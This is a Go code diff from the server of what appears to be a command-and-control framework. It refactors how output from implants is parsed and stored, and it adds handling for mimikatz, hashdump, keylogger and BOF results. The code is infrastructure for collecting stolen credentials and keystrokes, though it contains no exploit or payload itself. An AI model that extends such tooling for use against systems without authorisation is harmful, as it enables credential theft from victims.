@@ -52,75 +52,86 @@ func ContextCallback(task *core.Task, ctx context.Context) func(*implantpb.Spite
 				return
 			}
 		}
-		var ctxs output.Contexts
-		switch meta.ContextType {
-		case consts.ContextMedia:
-			if err := core.HandleMediaChunk(task, meta.Nonce, meta.Identifier, meta.FileName, meta.MediaKind, content); err != nil {
-				logs.Log.Error(err)
-			}
+		saveTaskContextsFromContent(task, meta, content)
+	}
+}
+
+func saveTaskContextsFromContent(task *core.Task, meta contextRequestMeta, content []byte) {
+	var ctxs output.Contexts
+	switch meta.ContextType {
+	case consts.ContextMedia:
+		if err := core.HandleMediaChunk(task, meta.Nonce, meta.Identifier, meta.FileName, meta.MediaKind, content); err != nil {
+			logs.Log.Error(err)
+		}
+		return
+	case output.GOGOPortType:
+		c, err := output.ParseGOGO(content)
+		if err != nil {
+			logs.Log.Error(err)
 			return
-		case output.GOGOPortType:
-			c, err := output.ParseGOGO(content)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
+		}
+		ctxs = append(ctxs, c)
+	case "zombie":
+		cs, err := output.ParseZombie(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
 			ctxs = append(ctxs, c)
-		case "zombie":
-			cs, err := output.ParseZombie(content)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-			for _, c := range cs {
-				ctxs = append(ctxs, c)
-			}
-		case "mimikatz":
-			cs, err := output.ParseMimikatz(content)
-			//fmt.Println(string(content))
-			//fmt.Printf("cs: %v", cs)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-			for _, c := range cs {
-				ctxs = append(ctxs, c)
-			}
-		case consts.ContextKeyLogger:
-			err := core.HandleKeylogger(content, task, meta.Identifier, meta.FileName, meta.Nonce)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
+		}
+	case "mimikatz":
+		cs, err := output.ParseMimikatz(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
+			ctxs = append(ctxs, c)
+		}
+	case "hashdump":
+		cs, err := output.ParseHashdump(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
+			ctxs = append(ctxs, c)
+		}
+	case consts.ContextKeyLogger:
+		err := core.HandleKeylogger(content, task, meta.Identifier, meta.FileName, meta.Nonce)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		return
+	}
+
+	for _, c := range ctxs {
+		value, err := json.Marshal(c)
+		if err != nil {
+			logs.Log.Error(err)
 			return
 		}
 
-		for _, c := range ctxs {
-			value, err := json.Marshal(c)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-
-			model, err := db.SaveContext(&clientpb.Context{
-				Task:    task.ToProtobuf(),
-				Session: task.Session.ToProtobufLite(),
-				Type:    c.Type(),
-				Value:   value,
-				Nonce:   meta.Nonce,
-			})
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-
-			core.EventBroker.Publish(core.Event{
-				EventType: consts.EventContext,
-				Op:        c.Type(),
-				Task:      task.ToProtobuf(),
-				Message:   fmt.Sprintf("new %s context: %s", c.Type(), model.ID),
-			})
+		model, err := db.SaveContext(&clientpb.Context{
+			Task:    task.ToProtobuf(),
+			Session: task.Session.ToProtobufLite(),
+			Type:    c.Type(),
+			Value:   value,
+			Nonce:   meta.Nonce,
+		})
+		if err != nil {
+			logs.Log.Error(err)
+			return
 		}
+
+		core.EventBroker.Publish(core.Event{
+			EventType: consts.EventContext,
+			Op:        c.Type(),
+			Task:      task.ToProtobuf(),
+			Message:   fmt.Sprintf("new %s context: %s", c.Type(), model.ID),
+		})
 	}
 }
 
@@ -192,9 +203,12 @@ func (rpc *Server) ExecuteBof(ctx context.Context, req *implantpb.ExecuteBinary)
 		}
 
 		// handler context bof callback
+		meta := getContextMeta(ctx)
 		var results strings.Builder
 		for _, bofResp := range bofResps.(output.BOFResponses) {
 			switch bofResp.CallbackType {
+			case output.CallbackOutput, output.CallbackOutputOem, output.CallbackOutputUtf8:
+				results.Write(bofResp.Data)
 			case output.CallbackScreenshot:
 				if bofResp.Length <= 4 {
 					results.WriteString("Null screenshot data\n")
@@ -210,6 +224,9 @@ func (rpc *Server) ExecuteBof(ctx context.Context, req *implantpb.ExecuteBinary)
 			default:
 				continue
 			}
+		}
+		if meta.ContextType != "" && meta.Nonce != "" && results.Len() > 0 {
+			saveTaskContextsFromContent(greq.Task, meta, []byte(results.String()))
 		}
 	})
 }
